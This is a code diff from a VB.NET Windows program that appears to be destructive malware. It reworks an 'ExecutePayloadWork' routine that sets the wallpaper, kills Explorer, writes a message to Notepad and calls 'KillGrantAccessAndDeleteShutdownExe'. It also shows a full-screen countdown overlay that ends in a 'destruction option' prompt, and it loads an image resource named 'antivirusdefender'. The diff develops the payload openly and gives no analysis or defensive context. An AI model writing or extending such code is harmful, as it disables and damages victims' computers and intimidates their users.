@@ -179,11 +179,10 @@ Public Class Form1
     Public Class FullScreenOverlay
         Inherits Form
 
-        Private ReadOnly random As New Random()
         Public ReadOnly timerLabel As New Label()
         Private ReadOnly audioPlayer As New AudioPlayer()
         Public countdownTime As Integer = 60 ' Countdown timer in seconds
-        Private portalEffectPhase As Single = 0.05F ' Phase for wavy distortion
+        Private ReadOnly portalEffectPhase As Single = 0.05F ' Phase for wavy distortion
 
         ' Initialize the full-screen overlay form
         Public Sub New()
@@ -434,40 +433,33 @@ Public Class Form1
 
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
         Public Sub ApplyPortalEffect(g As Graphics)
-            Dim gridSize As Integer = 120 ' Size of each pixelated "block"
+            Dim gridSize As Integer = 200 ' Larger grid size reduces the load
+
+            ' Enable double buffering
+            DoubleBuffered = True
 
             Try
                 ' Load the byte array from resources using My.Resources
                 Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender
-
-                ' Convert the byte array to an Image
                 Dim portalImage As Image
+
                 Using ms As New MemoryStream(portalImageBytes)
                     portalImage = Image.FromStream(ms)
                 End Using
 
-                ' Save the image to file
-                Dim filePath As String = Path.Combine(Path.GetTempPath(), "antivirusdefender.png")
-                portalImage.Save(filePath, Imaging.ImageFormat.Png)
-
-                ' Draw the image with the portal effect
+                ' Draw with optimized loop
                 For y As Integer = 0 To Height Step gridSize
                     For x As Integer = 0 To Width Step gridSize
-                        ' Calculate distorted positions using sine wave (for swirling effect)
-                        Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
-                        Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
+                        ' Apply reduced distortion for performance
+                        Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 40.0F) * 5)
+                        Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 40.0F) * 5)
 
-                        ' Create random purple color shades for the portal
-                        Dim colorIntensity As Integer = random.Next(128, 256)
-                        Dim portalColor As Color = Color.FromArgb(colorIntensity, 128, 0, 128)
-
-                        ' Draw the image at the distorted coordinates
+                        ' Draw image blocks with calculated distortion
                         g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
                     Next
                 Next
 
             Catch ex As Exception
-                ' Handle exception, display a message
                 MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
         End Sub
@@ -499,7 +491,6 @@ Public Class Form1
             If overlay.countdownTime > 0 Then
                 overlay.countdownTime -= 1
                 overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
-                BwKillExplorer.RunWorkerAsync()
 
             Else
                 ' When countdown finishes, prompt user for destruction option
@@ -968,7 +959,7 @@ Public Class Form1
     Private Shared Function SystemParametersInfo(uAction As UInteger, uParam As UInteger, lpvParam As String, fuWinIni As UInteger) As Boolean
     End Function
 
-    ' Constants for setting wallpaper
+    ' Constants foar setting wallpaper
     Private Const SPI_SETDESKWALLPAPER As Integer = 20
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
     Private Const SPIF_SENDCHANGE As Integer = &H2
@@ -1396,13 +1387,35 @@ Public Class Form1
     ' Method to execute the payload using BackgroundWorker
     Private Sub ExecutePayloadWork()
         Try
-            BwTimerWorker.RunWorkerAsync()
+            Try
+                AnimationTimer.Start()
+            Catch ex As Exception
+                Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+            End Try
 
-            BwSetWallpaper.RunWorkerAsync()
+            Try
+                VisualEffectTimer.Start()
+            Catch ex As Exception
+                Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
+            End Try
 
-            BwKillExplorer.RunWorkerAsync()
+            Try
+                SetWallpaper()
+            Catch ex As Exception
+                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+            End Try
 
-            BwWriteMessage.RunWorkerAsync()
+            Try
+                KillExplorerAndMore()
+            Catch ex As Exception
+                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+            End Try
+
+            Try
+                WriteMessageToNotepad()
+            Catch ex As Exception
+                Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+            End Try
 
             Try
                 KillGrantAccessAndDeleteShutdownExe()
@@ -1464,22 +1477,6 @@ Public Class Form1
     Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
     End Sub
 
-    Private Sub BwSetWallpaper_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwSetWallpaper.DoWork
-        Try
-            SetWallpaper()
-        Catch ex As Exception
-            Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub BwWriteMessage_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwWriteMessage.DoWork
-        Try
-            WriteMessageToNotepad()
-        Catch ex As Exception
-            Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
-        End Try
-    End Sub
-
     Private Sub BwPayloadWorker_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwPayloadWorker.DoWork
         Try
             ExecutePayloadWork()
@@ -1488,16 +1485,4 @@ Public Class Form1
         End Try
     End Sub
 
-    Private Sub BwTimerWorker_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwTimerWorker.DoWork
-        Try
-            VisualEffectTimer.Start()
-        Catch ex As Exception
-            Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
-        End Try
-        Try
-            AnimationTimer.Start()
-        Catch ex As Exception
-            Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
-        End Try
-    End Sub
 End Class
